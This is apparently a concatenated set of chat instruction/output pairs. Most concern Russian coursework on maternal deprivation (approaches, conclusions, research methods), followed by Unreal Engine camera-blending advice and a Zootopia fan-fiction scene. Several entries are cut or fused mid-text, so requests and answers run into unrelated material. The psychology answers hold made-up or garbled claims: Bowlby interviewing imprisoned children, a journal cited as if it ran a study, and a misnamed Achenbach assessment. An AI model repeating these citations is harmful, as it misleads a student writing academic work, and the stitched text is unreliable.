реакции ребенка на разлуку с матерью. Вначале происходит протест (рыдания и активные попытки найти матерь), за ним следует отчаяние (апатия и депрессия), и, наконец, отстранение, когда ребенок кажется приспособленным к отсутствию матери, но это приводит к отчуждению и затруднениям в создании привязанностей в будущем. 3. Безопасная и небезопасная привязанность – типы привязанности, которые формируются в раннем детстве в зависимости от реакции матери на потребности ребенка. Безопасная привязанность возникает, когда материнский ответ на потребности ребенка последователен и предсказуем, что ведет к образованию у ребенка чувства эмоциональной стабильности и безопасности. Этологический подход к анализу материнской депривации выделяет важность ранних взаимодействий матери и ребенка для формирования базового смысла доверия и безопасности у ребенка, что является основополагающим для его дальнейшего социального и эмоционального развития. Недостаток или искажение этих взаимодействий, напротив, может привести к долговременным негативным последствиям для психологического благополучия ребенка."},{"instruction":"Сравни, пожалуйста, этологический, психоаналитический и нейробиологический подходы. Вот, что я написала про последние два: 2.Психоаналитический подход к анализу влияния материнской депривации на психическое развитие ребёнка заключался в следующем: Согласно психоаналитической точке зрения, депривация - это недостаточное удовлетворение какой-либо потребности или желания, которое воспринимается как нечто существенное. З. Фрейд рассматривал депривацию как результат фрустрации влечения, которое не может быть удовлетворено из-за запрета. Особый интерес представляла для Фрейда сексуальная депривация. Позднее психоанализ стал больше уделять внимания материнской депривации, вызванной как окончательным, так и временным отсутствием матери, а также её трудностями в обеспечении первичного ухода за младенцем. Такая депривация может иметь необратимые последствия для развития ребёнка. Выделялись различные формы депривации у младенца - \\"количественная\\" и \\"качественная\\". Изучались эффекты \\"госпитализма\\" и \\"анаклизической депрессии\\". Также выделяли аффективную депривацию. Исследовались последствия депривации для развития детей, находившихся в институтах, больницах или приёмных семьях. Это привело к наблюдению депрессий и граничных патологий. Таким образом, психоаналитики подробно изучали различные формы и последствия депривации на уровне психического развития ребёнка. (16) 3. Нейробиологический подход к изучению влияния материнской депривации на развитие ребёнка заключается в следующем: Согласно многочисленным эпидемиологическим исследованиям, ранняя потеря родителей значительно увеличивает риск развития различных психических расстройств на протяжении всей жизни, таких как шизофрения, депрессия и тревожные состояния. У млекопитающих, в том числе и у людей, основную роль в воспитании детенышей играет мать. Через свое поведение и взаимодействие она регулирует работу многих физиологических систем организма детеныша, включая стресс-реагирующую систему. Исследователи широко используют модель материнской депривации на 24 часа у грызунов для изучения влияния раннего стресса. Было показано, что такая депривация вызывает дезингибицию оси гипоталамус-гипофиз-надпочечники и нарушает нормальный ход развития этой системы. Также отмечаются негативные последствия депривации для процессов нейрогенеза, функционирования нейромедиаторных систем и уровня воспаления в мозге. Эти нейробиологические изменения коррелируют с различными отклонениями в поведении. Кроме того, последствия депривации во многом зависят от пола, возраста ребенка и индивидуальных особенностей, что важно учитывать при изучении биологических механизмов уязвимости к стрессу. (17)","output":"Этологический, психоаналитический и нейробиологический подходы представляют различные перспективы анализа влияния материнской депривации на развитие ребенка, каждый со своей уникальной теоретической базой и методами исследования. Этологический подход, как описано ранее, фокусируется на биоэволюционной роли привязанностей для выживания вида и безопасности потомства. Этот подход акцентирует внимание на поведенческих проявлениях, таких как протест и поиски родителя, а также на стадиях, которые ребенок проходит при разлуке с матерью. Данная теория подчеркивает значимость ранних отношений привязанности за счет их влияния на развитие навыков межличностного взаимодействия и способность справляться со стрессами в более поздних стадиях жизни. Психоаналитический подход, исходя из работ Зигмунда Фрейда и последующих исследователей, основывается на идее, что неудовлетворенность базовых эмоциональных потребностей в раннем детстве приводит к фрустрации и конфликту внутренних влечений. Особое внимание в данном подходе уделяется межличностным первоосновам, формирующимся в результате ранних взаимодействий с родителем, и их долгосрочному воздействию на структуру личности и психические расстройства. Эмоциональный дискомфорт младенца в условиях депривации считается центральным в этом процессе. Нейробиологический подход предлагает глубокое понимание биологических механизмов, лежащих в основе влияния депривации на развитие ребенка. Исследуется, как ранние стрессовые опыты, включая потерю родительского ухода, затрагивают нейрохимические и нейрофизиологические процессы, такие как работа гипоталамо-гипофизарно-адренальной оси, которая регулирует реакцию на стресс. Моделирование состояния депривации, например, на животных, позволяет изучать последствия этих нарушений для развития мозга и поведения. В сравнении этих подходов: - Этологический подход занимается преимущественно поведенческими аспектами и наблюдениями за поведением в естественной среде; - Психоаналитический подход фокусируется на эмоциональных и внутриличностных факторах, таких как желания, конфликты и сексуальное развитие; - Нейробиологический подход направлен на изучение анатомии и физиологии мозга, гормональной системы и других биологических структур, повлиявших на развитие. Каждый из этих подходов вносит важный вклад в наше понимание последствий материнской депривации, позволяя нам видеть более полную картину того, как отсутствие родительской заботы может сказать на развитии ребенка через разные объективные и субъективные линзы."},{"instruction":"Напиши мне большой подробный научный вывод по первой главе (там всё, что ты мне скинул). Там описание и сравнение этих подходов, история материнской депривации, сравнение трех ее определений, описание теории привязанности, этапы и т.д","output":"Вывод по первой главе курсовой работы может быть сформулирован следующим образом: Изучение материнской депривации является важным аспектом в области психологии развития и смежных дисциплин, таких как этология, психоанализ и нейробиология. Анализ различных подходов к данному феномену обнаруживает уникальные теоретические и методологические основы, которые служат для понимания последствий отсутствия или неполноценного материнского ухода за детское развитие. Этологический подход, акцентирующий внимание на врожденных и инстинктивных поведенческих паттернах привязанности, рассматривает материнскую депривацию с позиции эволюционно обусловленной необходимости поддержания матерью непосредственного физического и эмоционального контакта с ребенком. Данная перспектива подчеркивает уникальные стадии реакции ребенка на разлуку с матерью, такие как протест, отчаяние и отстранение, и взаимосвязь этих стадий с долгосрочными последствиями для формирования стабильных взаимоотношений и способности справляться со стрессом. Психоаналитический подход, в лучших традициях Фрейда и его последователей, сконцентрирован на внутреннем психическом мире ребенка и взаимосвязи недостаточного удовлетворения базовых потребностей в раннем возрасте с развитием неврозов, депрессий и других патологий. Он утверждает, что аффективная депривация и проблемы с первичным уходом за младенцем могут приводить к необратимым изменениям в психическом развитии. Нейробиологический подход привлекает внимание к молекулярным и клеточным изменениям, происходящим в мозге в ответ на раннюю потерю материнской поддержки. Эпидемиологические исследования и эксперименты на животных помогают выявить, как такой стресс влияет на функционирование оси гипоталамус-гипофиз-надпочечники и прочие физиологические системы, а также как он коррелирует с поведенческими аномалиями и психическими расстройствами. Исследования, основанные на теории привязанности, выделяют ключевую роль ранних отношений с матерью для развития уверенности в себе и социального поведения. Роль матери в эффективности привязанности подтверждается примерами ее отсутствия, которые могут привести к сдержанности в выражении эмоций, трудностям в построении отношений и страху перед последующими потерями. Также был проведен сравнительный анализ трех основных определений материнской депривации, каждое из которых описывает разные стороны явления и предлагает разное понимание его причин и последствий. В результате обзора первой главы можно констатировать, что материнская депривация — многогранное явление, последствия которого настолько обширны и значимы, что их можно изучать только с использованием мультидисциплинарного подхода. Это помогает создать комплексное представление о влиянии разлуки с матерью на психическое и физическое здоровье ребенка на протяжении его жизни."},{"instruction":"Слишком много про подходы. Там же и история, и сравнение определений и подходов и т.д","output":"В первой главе курсовой работы приводится всесторонний анализ концепции материнской депривации, включающий историческую ретроспективу, сравнение теоретических подходов и определений, а также детальный разбор основных фаз эмоциональной реакции ребенка на разлуку с матерью в контексте теории привязанности. Исторические аспекты концепции демонстрируют её эволюцию от исследований психологической реакции детей на разлуку с матерью к углублённому пониманию последствий депривации на последующее развитие ребенка. Работы Джона Боулби оформили фундамент современных представлений о теории привязанности, наглядно продемонстрировав связь детской привязанности и реакций на разлуку с родителем с последующим формированием личности и поведенческими патологиями. Сравнительный анализ теоретических подходов к изучению материнской депривации открывает разнообразие взглядов на проблему. Этологический подход подчеркивает биологическую природу и важность привязанности для выживания; психоаналитическое направление концентрируется на эмоциональных и внутриличностных последствиях отсутствия материнского участия; нейробиологический подход предоставляет инсайты о физиологических измениях мозга, вызванных депривацией и стрессом от разлуки. Сравнение определений материнской депривации выявляет различия в их подходах к оценке детского опыта и его значимости. Проанализированные \\"количественная\\" и \\"качественная\\" депривация обозначают разные аспекты потери - отсутствие физического присутствия матери и низкое качество её взаимодействия с ребёнком. Оба варианта имеют свои уникальные и потенциально долгосрочные воздействия на психическое развитие детей. Теория привязанности проливает свет на фазы, через которые проходит ребенок при разлуке с матерью: протест, отчаяние и отстранение. Эти этапы имеют ключевое значение для понимания динамики адаптации ребенка к отсутствию матери и последующих стратегий поведения и привязанностей. В целом, первая глава отражает сложность и многогранность явления материнской депривации, которое оказывает далекосяжное, многоуровневое влияние на эмоциональное благополучие и психологическую адаптацию ребенка. Исследовательский интерес к этой теме постоянно возрастает, внося важный вклад в разработку методов предупреждения и лечения психических расстройств, обусловленных ранними опытами депривации."},{"instruction":"Мне нужен конкретный вывод по информации, которую я там написала (не обзор). Я написала историю, сравнила определения, подходы, психологические этапы (Р.Шпиц, Л. ф, Мейер т.д.)","output":"В заключении первой главы можно определить, что концепция материнской депривации является многогранной и обладает значительным влиянием на психологическое и эмоциональное развитие ребенка. Глубокий исторический анализ данной темы, начиная с работ таких исследователей как Р. Шпиц и Л.Ф. Мейер, показывает, как научные взгляды изменялись со временем, расширяя наше понимание воздействия разлуки с матерью на ребенка. Исследования психологических этапов, через которые проходят дети во время и после длительной разлуки, обнаруживают сложные эмоциональные реакции, такие как протест, отчаяние и отстранение. Эти этапы являются ключевыми для объяснения того, как дети воспринимают и перерабатывают эмоциональные травмы, вызванные разлукой, и как эти переживания могут влиять на их дальнейшее развитие. Сравнение различных определений и подходов к материнской депривации выявило, что, несмотря на разнообразие трактовок, все они сходятся во мнении, что отсутствие достаточного уровня ухода и эмоциональной поддержки со стороны матери имеет долгосрочные последствия для развития ребенка. В частности, подчеркивается, что как \\"количественная\\", так и \\"качественная\\" депривация могут представлять собой серьезные вызовы для психического здоровья, и то, как ребенок преодолевает депривацию, может иметь разные последствия в зависимости от его уникального набора обстоятельств и характеристик. Теоретические подходы к исследованию материнской депривации дополняют друг друга, предоставляя собой разные ракурсы понимания этой сложной проблемы. Этологический подход подчеркивает инстинктивные основы привязанности и её роль в выживании и социальном развитии, психоаналитический — внутренние конфликты и эмоциональные переживания, обусловленные депривацией, а нейробиологический — конкретные изменения в мозге и естественные механизмы адаптации к стрессу. Заключительно можно утвердить, что в части материнской депривации было достигнуто значительное прогрессирование в понимании её многоаспектного воздействия на ребенка, возможных путей преодоления негативных эффектов и оптимизации условий для полноценного воспитания и развития."},{"instruction":"А где можно прочитать про методы исследования влияния материнской депривации на психическое здоровье ребёнка?

Подробно, научно, много. Включи это, пожалуйста, но перефразируй: Вильям Голдфарб (1947) сравнил детей, которые провели в закрытом детском доме в условиях материнской депривации первый год жизни совместно с детьми, прожившими в приюте 3 года. Обследование проводилось в 3,5, 6,5, 8,5 и 12 лет. Голдфарб установил, что дети, находившиеся в приюте 3 года, отставали в адаптации по всем показателям раз-вития, подчеркивая, что в этом случае наблюдается гораздо более выраженное ограничение способности к общению, интеллектуальное отставание, бедные речевые навыки, по-вышенная агрессивность, жестокость, раздражительность, бесконтрольное импульсивное поведение |1]]. И. Лагмейер и 3. Матейчек (1984) также указывают, что дети, долгое время находящиеся в состоянии эмоциональной депривации, могут иметь отставания в развитии, преступные наклонности и психозы, а многие нервно-психические расстройства у детей, возникшие в условиях депривации, имеют сложную структуру. При этом данные исследователи обращают внимание на то, что необходимо дифференцировать психические расстройств, друшкие у детей вследствие психической депривации от расстройств, возникших по другим причинам. Барбара Тизард (1989) исследовала одинаковые группы детей, длительно находив-шихся в закрытом учреждении, и детей, также сначала находившихся в приюте, но быстро усыновленных или переведенных в семейный детский дом, где они опекались более чем 80 специалистами. Она обнаружила, что множество расстройств, описанных Голд-фарбом, характеризуются постепенным сглаживанием и компенсацией. В 8-летнем возрасте Б. Тизард зафиксировала у этих детей интеллектуальную норму и большинство из них сформировали тесные эмоциональные контакты с приемными родителями. Однако дети, которые провели в условиях закрытого детского учреждения (т. е. в условиях мате-ринской депривации) более 4-х лет, были более беспокойными, непослушными и часто не успевали в обучении. Они оставались эмоционально неустойчивыми и тревожными в возрасте 16 лет и имели отклоняющееся антиобщественное поведение.","output":"Эмпирический метод в исследованиях материнской депривации подразумевает использование систематических и наблюдаемых приёмов, для проверки гипотез и изучения воздействия данного явления на развитие ребёнка. В таких исследованиях применяются количественные и качественные методы, включающие наблюдение, тестирование и различные формы оценок. Работа Вильяма Голдфарба в 1947 году является ранним примером эмпирического исследования материнской депривации - он проанализировал различия в адаптации между детьми, которые провели начальные годы жизни в изоляции от общения с матерью, и теми, кто был в детском доме до трёхлетнего возраста. Он осуществил мониторинг и оценку развития детей в возрастных промежутках 3,5; 6,5; 8,5 и 12 лет. Исследование показало, что дети, испытывающие материнскую депривацию более длительное время, проявляли устойчивые дефициты в развитии, общении, интеллектуальных способностях, а также повышенные агрессию и импульсивность. Исследователи И. Лагмейер и З. Матейчек в 1984 году продемонстрировали, что длительная эмоциональная депривация может приводить к задержкам развития, преступным склонностям и психозам, подчёркивая тот факт, что выявленные нервно-психические нарушения обладают сложной структурой и необходимо проводить дифференциальную диагностику, чтобы отграничить расстройства, обусловленные депривацией, от тех, что возникли по другим причинам. Исследование Барбары Тизард в 1989 году раскрыло динамику адаптации у детей, переживших длительную изоляцию в детском учреждении и тех, кто вскоре после пребывания в приюте был усыновлён или переведён в семейные условия ухода. Её наблюдения показали, что правильно организованное воспитание и уход, даже после периода депривации, могут способствовать снижению ряда негативных последствий, описанных Голдфарбом. Тизард отметила, что в восемь лет детям, которые вышли из приютов и жили в поддерживающей среде, удалось достичь нормальных уровней интеллектуального развития и сформировать близкие эмоциональные связи с приёмными родителями. В свою очередь, те, кто продолжал жить в изоляции от материнского ухода, как правило, были более тревожны, испытывали сложности в обучении и часто демонстрировали антисоциальное поведение даже в возрасте 16 лет. Важно отметить, что эмпирические методы исследования материнской депривации требуют комплексного подхода к оценке и измерению последствий, так как речь идёт о долгосрочном влиянии на психическое здоровье. Данные исследования используют различные психологические тесты, интервью и оценочные шкалы для изучения когнитивного развития, эмоционального состояния, социального взаимодействия и поведенческих реакций. Для более острого понимания влияния депривации, исследования также часто включают поперечное и продольное сравнение различных групп детей, что позволяет принять во внимание множество переменных, включая возраст начала депривации, продолжительность разлуки, характер воспитательной среды и индивидуальные различия между детьми."},{"instruction":"Спасибо.

А ты можешь написать мне про метод беседы? В кон тексте влияния материнской депривации на психическое развитие ребёнка, пожалуйста. И, если получится, укажи какие-нибудь примеры исследований","output":"Метод беседы, или интервью, является одним из ключевых инструментов в исследованиях психологии, включая анализ влияния материнской депривации на психическое развитие ребёнка. Этот метод позволяет получить глубокое понимание индивидуального опыта, чувств, восприятия и мыслей субъекта исследования. # Применение метода беседы: Используя метод беседы, исследователи могут задавать открытые вопросы, что позволяет собеседникам детально описывать свои личные переживания и реакции на события. В контексте материнской депривации, этот метод часто используется для того, чтобы выявить внутренний мир ребенка, его чувства и мысли по поводу отсутствия или недостатка материнской заботы. Качественные интервью могут выявить субъективные аспекты переживаний депривации, которые не всегда доступны для наблюдения или количественного измерения. # Примеры исследований: Один из классических примеров использования метода беседы — это исследования Джона Боулби, который в середине 20-го века проводил интервью с детьми, оказавшимися за решеткой и испытывающими материнскую депривацию. Эти беседы помогли ему разработать теорию привязанности. Современные исследования также часто включают метод беседы. Примером может служить работа *Developmental Psychology*, которая провела серию интервью с детьми, пережившими семейную разлуку, чтобы определить, как долгосрочная разлука с родителями влияет на их поведение и социальное взаимодействие на различных жизненных этапах. # Возможности и ограничения метода: Метод беседы обладает рядом преимуществ, включая гибкость в извлечении детализированной информации и возможность установления доверительных отношений между исследователем и участником. Однако метод требует тщательной подготовки вопросов и стратегий для наилучшего сбора информации, а также качественного анализа полученных данных. Основным ограничением является субъективный характер данных, а также влияние предвзятости исследователя и частного восприятия информации респондентами. Тем не менее, метод беседы, используемый в комбинации с другими методами, такими как стандартизированные психологические тесты и наблюдения, способствует получению комплексного понимания эффектов материнской депривации на психическое развитие ребенка. Исследователи продолжают внедрять этот метод для изучения механизмов приспособления, компенсации и реабилитации детей, подвергшихся отсутствию материнской заботы, и для разработки эффективных стратегий воспитания и лечения."},{"instruction":"И про метод тестирования.

В контексте изучения влияния материнской депривации на психическое здоровье ребенка тестирование может включать использование психометрических тестов, шкал оценки поведения и опросников, которые позволяют количественно оценить четко определенные переменные. # Применение метода тестирования: Метод тестирования обеспечивает возможность оценки таких параметров, как интеллектуальный уровень, языковое развитие, социальные навыки, эмоциональное благополучие и приспособленность к обучению. Эти данные можно сравнивать с установленными нормами или между различными группами, чтобы определить степень влияния материнской депривации на развитие детей. # Примеры тестов и опросников: 1. **Шкалы развития ребенка Бейли (Bayley Scales of Infant Development) -** часто используются для оценки когнитивного, языкового и моторного развития детей раннего возраста. 2. **Тест Векслера для детей (Wechsler Intelligence Scale for Children - WISC) -** инструмент, применяемый для определения интеллектуальных способностей у детей до подросткового возраста. 3. **Опросник Айзенка по типам личности (Eysenck Personality Questionnaire) -** может использоваться со старшими детьми для оценки характеристик личности, которые могут быть затронуты в условиях депривации. 4. **Шкала эмоционального реагирования Айкен (Achenbach System of Empirically Based Assessment - ASEBA) -** представляет собой набор инструментов для оценки эмоциональных и поведенческих проблем у детей. 5. **Стресс-шкала для родителей (Parental Stress Scale) -** может быть использована для оценки уровня стресса у родителей и опекунов, что может косвенно отражать условия детской среды и наличие депривации. 6. **Шкала депривации институционального ухода (Institutional Care Deprivation Scale) -** разработана специально для оценки опыта детей, воспитывающихся в институциональных условиях. # Преимущества и ограничения метода: Основным преимуществом метода тестирования является объективность и возможность стандартизированного сравнения результатов. Тесты и опросники могут быть надежными и валидными инструментами для измерения конкретных психологических конструктов. Однако они также могут иметь ограничения, такие как культурная и языковая специфичность, зависимость результатов от мотивации и состояния респондента во время тестирования, и необходимость обучения для администрирования и интерпретации некоторых сложных тестов. Тестирование может быть использовано в сочетании с другими методами, такими как наблюдения или беседы, для получения наиболее полной картины воздействия материнской депривации.

Этот метод может также помочь определить, как общественное восприятие влияния материнской депривации на развитие ребенка изменялось со временем и как эти изменения отражены в политике и практике ухода за детьми. # Примеры анализа документов: В отношении материнской депривации анализ документов может включать, например, изучение исследовательских работ и публикаций, которые описывают исторические данные о развитии детей, живущих в интернатах или домах ребенка. Также конкретные кейс-стади, основанные на архивных медицинских записях или психологических отчетах осиротевших детей, в которых зафиксированы информация о развитии и эмоциональном состоянии. # Преимущества и ограничения метода: Основное преимущество метода заключается в его обширности и глубине, а также в том, что он позволяет исследователям увидеть \\"большую картину\\". Метод анализа документов может выявить информацию, которая не может быть получена через наблюдение или субъективные отчеты. Однако он также имеет свои ограничения, такие как предвзятость в письменных источниках или неполнота архивов. Документы, отобранные для анализа, могут быть устаревшими или не отражать всех аспектов изучаемого явления. Еще одна трудность состоит в том, что документы часто создаются с определенной целью или предназначением и могут не отражать всю полноту контекста исследуемого явления. Возникает необходимость критического подхода к анализу документов и проверки информации на предмет ее достоверности и репрезентативности. # Примеры исследований с использованием анализа документов: Исторические исследования последствий материнской депривации включали анализ правительственных докладов о состоянии детских домов и интернатов. Например, исследования, проведенные после Второй мировой войны, опиралась на архивные записи для изучения влияния депривации на психологическое состояние эвакуированных и осиротевших детей. Современные исследования могут анализировать базы данных родителей-одиночек или опекунов, чтобы изучить корреляции между условиями ухода и развитием ребенка. Таким образом, метод анализа документов остается ценным подходом в психологических исследованиях, предоставляющим пространство для глубокого понимания прошлых и настоящих практик в сфере заботы о детях и оценки их воздействия на психическое здоровье подрастающего поколения."},{"instruction":"Придумай уникальный seo H2 для этого текста: \\"Каждый уголок нашего онлайн-магазина наполнен чарующим ароматом и великолепным вкусом натуральных шоколадных конфет.

Here's a step-by-step guide on how to achieve this: 1. Identify the Target Object: You first need to have a reference to the object that you want the camera to move towards. This could be an actor placed in the world or any other identifiable object in your level. 2. Calculate the Desired Camera Transform: Determine where you want the camera to be oriented in relation to the target object. For instance, if you want the camera to look directly at the object, you might place it a certain distance away and adjust the pitch/yaw of the camera's rotation to face the object. 3. Open the Blueprint: Open the Blueprint script of the actor or controller that is controlling the player's camera. 4. Add a Timeline: Add a Timeline node to interpolate between the current and the desired positions/rotations over time. - Create a new float track within the timeline. - Set up keyframes for the float track from 0 to 1, representing the start and the end of the interpolation. - Set the length of the timeline to control the duration of the movement. 5. Get the Current Camera Transform: Use the \\"Get Transform\\" node to obtain the current location and rotation of the camera. 6. Use the \\"Lerp\\" Nodes: Use the \\"Lerp (Vector)\\" node to interpolate between the current camera position and the desired position. Also use the \\"Lerp (Rotator)\\" node to interpolate between the current camera rotation and the desired rotation. - Connect the \\"Update\\" output of the Timeline to the alpha input of both Lerp nodes. - Connect the timeline's float track to the alpha input of the Lerp nodes. 7. Update Camera Transform: During each tick of the timeline, use the \\"Set Actor Transform\\" or \\"Set World Transform\\"/\\"Set Relative Transform\\" (if in a component) node to update the camera's position and rotation based on the Lerp nodes' outputs. 8. Play the Timeline: At the moment you want to start moving the camera, trigger the \\"Play\\" action on the Timeline node. Here's what the Blueprint setup might look like in a simplified representation: \`\`\`plaintext [Input Trigger] -> Play (Timeline) Timeline (with float track 'Alpha') -> Update -> Lerp (Vector) (Camera Position) Update -> Lerp (Rotator) (Camera Rotation) Current Camera Transform (Get Actor Transform) -> A (Lerp) Desired Camera Transform (Get Actor Transform) -> B (Lerp) Lerp (Vector) Output -> Set Actor Location (or Set World Location) Lerp (Rotator) Output -> Set Actor Rotation (or Set World Rotation) \`\`\` Remember to connect the \\"Finished\\" output of the Timeline to any logic you want to execute once the camera has finished moving. This process will smoothly move the camera towards the target object. Ensure you correctly calculate the desired position and rotation so that the object remains in view during and after the camera has moved. Be also mindful of the game's context and make sure this camera movement doesn't disorient or negatively affect the player's experience."},{"instruction":"How to smoothly move player camera, close to an object and in view, in level in Unreal Engine","output":"To smoothly move a player camera close to an object and ensure the object is in view in Unreal Engine, you can implement an interpolation mechanism using Blueprints. You will typically use a combination of timeline interpolation and vector mathematics to achieve a smooth translation and rotation of the camera. Here's a general approach you can take: # Step 1: Identify the Target Object Make sure you have a reference to the object you want to focus on. If it's an \`Actor\`, you can get a reference to it through various methods, like collisions, tags, or manual assignment. # Step 2: Calculate Desired Camera Transform Determine where you want your camera to be relative to the object. You can calculate an offset based on the object's bounds or establish a fixed distance and direction. # Step 3: Create a Blueprint to Handle Camera Movement Depending on how you're controlling the camera, you may need to do this in your Player Controller, Player Character, Camera Actor, or Camera Component. # Step 4: Use a Timeline and Interpolation 1. **Create a Timeline**: In your Blueprint, add a new Timeline node. Within the timeline, create a float track from 0 to 1 which will act as the interpolant (alpha) for the Lerp functions. 2. **Setup Keyframes**: On the float track, place keyframes at the beginning and end (0 and 1) to represent the start and the finish of the transition. 3. **Lerp Between Transforms**: Use the \\"Lerp (Vector)\\" node to interpolate between the current camera position and the target position you calculated. For rotations, use the \\"Lerp (Rotator)\\" or \\"RInterp To\\" node to slerp smoothly between the current and target rotations. 4. **Connect the Timeline**: Connect the Timeline's \\"Update\\" output to the Lerp nodes' alpha (blend) inputs and configure the position and rotation outputs to move the camera. # Step 5: Set Camera Transform On each update of the Timeline, you should use the \\"Set World Location\\" and \\"Set World Rotation\\" nodes (or the \\"Set Actor Location\\" and \\"Set Actor Rotation\\" if using a camera actor) connected to the outputs of the Lerp nodes to move the camera. # Step 6: Play the Timeline When you want to initiate the camera movement, call the \\"Play\\" function on the Timeline node. Here's a simplified pseudo-representation of the Blueprint setup: \`\`\` +------------+ +-----------------+ | Input Trigger (E.g., a button press) | --> | Timeline 'MoveCamera' | +------------+ +-----------------+ | Update (float 'Alpha') v +-------------------------------+ +-------------------------------+ | Lerp (Vector) Current -> A | | Lerp (Rotator) Current -> A | | Desired Position -> B | | Desired Rotation -> B | +-------------------------------+ +-------------------------------+ | | v v +----------------------------------+ +-----------------------------------+ | Set World Location (Camera) | | Set World Rotation (Camera) | +----------------------------------+ +-----------------------------------+ \`\`\` Remember that you might need to handle special cases where the camera could collide with world geometry, or when you want the movement to stop under certain circumstances. You can add additional logic to manage these cases. Finally, always test the camera movement to ensure it's smooth and gives the player the intended perspective without causing motion sickness or disorientation."},{"instruction":"How to smoothly move player camera, close to an object and in view, in level in Unreal Engine. What node in blueprints can do that","output":"In Unreal Engine, to smoothly move the player's camera close to an object and ensure it remains in view, you would typically use a combination of the \\"Timeline\\" and \\"Lerp\\" nodes in Blueprints. The \\"Lerp\\" nodes help interpolate the camera's position and rotation over time, while the \\"Timeline\\" node controls the timing and speed of this interpolation. Here's an outline of how you can set up your Blueprint with the necessary nodes: 1. **Get Current Camera Transform**: Use the \\"Get Actor Transform\\" node (or \\"Get World Transform\\" if dealing with components) to obtain the camera's current position and rotation. 2. **Calculate Desired Camera Transform**: - Define the desired position and rotation—usually relative to an object. The \\"Get Actor Bounds\\" node can help when calculating offsets from an object. The \\"Find Look at Rotation\\" node can be useful to point the camera towards an object. 3. **Add a Timeline**: - Use the \\"Add Timeline\\" node to create an animation curve that will drive the interpolation from 0 to 1. 4. **Configure the Timeline**: - Add a Float Track to the Timeline and create a curve from 0 to 1 over the desired amount of time. - Play the Timeline when you wish to start the movement. 5. **Use Lerp Nodes**: - **Lerp (Vector)** to interpolate between the current position (A) and the desired position (B). Connect the Float Track to the \\"Alpha\\" of the Lerp node. - **Lerp (Rotator)** for smooth rotation changes. Similarly, connect the Float Track to the \\"Alpha\\". 6. **Set Camera Transform**: - On the \\"Update\\" output of the Timeline, connect the resulting values from the Lerp nodes to \\"Set Actor Location\\" and \\"Set Actor Rotation\\" (or the equivalent 'Set' nodes for components). 7. **Play the Timeline**: - When the player or game triggers this camera move, you'll want to call the \\"Play\\" function on the Timeline node to initiate the movement. A Blueprint setup may look like this: \`\`\`plaintext [Trigger Event] → [Play From Start (on Timeline)] [Timeline] │ ├→ [Update Output] │ │ │ ├──→ [Lerp (Vector)] → [Set Actor Location] │ └──→ [Lerp (Rotator)] → [Set Actor Rotation] │ └→ [Finished Output] → [Any cleanup or follow-up logic] [Get Actor Transform (Current Camera)] → [Lerp (Vector) A Input] [Desired Camera Position] → [Lerp (Vector) B Input] [Get Actor Rotation (Current Camera)] → [Lerp (Rotator) A Input] [Desired Camera Rotation] → [Lerp (Rotator) B Input] \`\`\` Make sure to adjust the transition speed and responsiveness by configuring the Timeline's curve and length accordingly. This approach ensures a smooth transition where the camera gradually moves towards the target object, and the Timeline allows for precise control over the animation's playback. Test and adjust the position and rotation calculations as needed to keep the object in view and provide a seamless experience for the player."},{"instruction":"is there a node that transitions from one camera to another smoothly in unreal engine","output":"Yes, Unreal Engine provides the \\"Set View Target with Blend\\" node, which is specifically designed to smoothly transition from one camera to another. This node is typically used in the context of a Player Controller and directly supports blending camera views over time. Here's how you can use it: 1. **Open your Player Controller Blueprint**: Ensure you're working within a Player Controller Blueprint or any Blueprint that has access to the Player Controller. 2. **Drag from the execution pin**: From an event or action that should trigger the camera switch, drag out from the execution pin and look for \\"Set View Target with Blend\\". 3. **Configure the node**: - \`Target\` is the reference to the Player Controller. - \`New View Target\` is the camera actor (or any actor with a camera component) that you want to transition to. - \`Blend Time\` is the duration over which the blend should occur. - \`Blend Type\` determines the blending function to use (e.g., linear, cubic, ease in/out). - \`Blend Exponent\` affects the acceleration if you're using a custom blending function. - \`Lock Outgoing\` can be used if you want to lock the current view target until the blend is completed. 4. **Trigger the transition**: Execute the event that's connected to the \\"Set View Target with Blend\\" node whenever you want to start the camera transition. Here's an example of using this node: \`\`\`plaintext [Player Input Event] │ ▼ [Set View Target with Blend] │ │ │ └──[New View Target: CameraActor2] │ │ │ └──[Blend Time: 2.0] │ │ │ └──[Blend Type: (as desired)] │ ▼ [Next Action] \`\`\` When the \\"Set View Target with Blend\\" node is executed, the camera view will smoothly transition from the current view target to the new camera over the specified blend time. This method is very convenient for cutscenes, cinematic sequences, or any gameplay scenarios where you want to shift the player's perspective without an abrupt jump from one view to another. Remember to have both your starting and ending cameras properly set up before beginning the blend."},{"instruction":"Hello there!","output":"Hello! How can I assist you today?

Rubbing her heavy eyelids, Judy perked her ears to their full length, akin to furry satellite dishes, trying to tune into the unusual sounds. With the stealth of a cat... well, a very large, non-predatory, bunny cat, Judy tiptoed to her bedroom door. She silently turned the knob and peered into the living room, which was illuminated by a sequence of soft, rhythmic lights. There, in the tranquil glow of flashing LEDs, was none other than Gideon Grey. But this was not the humble baker she remembered. No, in this bizarre alternate Zootopia, Gideon had traded his apron and baking trays for a smartphone gimbal and the life of a clickbait social media influencer. \\"Whatcha doin', followers? It's your fox, Gideon Grey, here with another midnight munchies livestream. Now, let's not wake our bunny host as I break into her fridge and review her carrot collection – because who doesn't love crunch-time drama?\\" Confused and more than a little annoyed, Judy leapt into action. She bolted to Nick Wilde's room and woke him with a swift tap. \\"Nick, you gotta see this! Gideon’s in our apartment, and he's—\\" \\"Livestreaming?\\" Nick groaned as he rubbed his eyes. \\"What's he doing, trying to become famous or lose his tail?\\" Judy nodded, and both of them sprang from the room, ready to uphold the law – even if said lawbreaker was narrating every bite of stolen carrot for his online fanbase. \\"Looks like we've got some surprise guests, fur-fans! Say hello to Officer Hopps and Officer Wilde!\\" Gideon announced jubilantly, camera swiveling to the police pair. \\"Alright, Gideon. You're under arrest for breaking and entering,\\" Judy declared while trying to maintain her composure for the live audience. Nick, on the other paw, decided to play along. \\"Hey, livestreamers! If you enjoy watching real-life arrests, don't forget to like, subscribe, and hit that notification bell for more criminally good content!\\" Just when they were about to handcuff Gideon, a tiny squeak of a voice piped through from the shadows. It was Travis the ferret, Gideon's reluctant assistant and partner in clicks. \\"Travis, now! Unleash Operation Subscriber Shield!\\" Gideon exclaimed as he ducked and giggled, awaiting his escape plan. Out popped Travis, wielding a massive tablet displaying the livestream comment feed. \\"See, officers, we can't be arrested, the people love us!” Indeed, a relentless stream of heart emojis and 'Don't Arrest Gideon' hashtags bombarded the tablet screen. Unmoved by this peculiar plea, Judy and Nick advanced, unimpressed by the social media spectacle. Judy caught Gideon while Nick cornered a wildly gyrating Travis, who was still holding the tablet like a discount DJ. 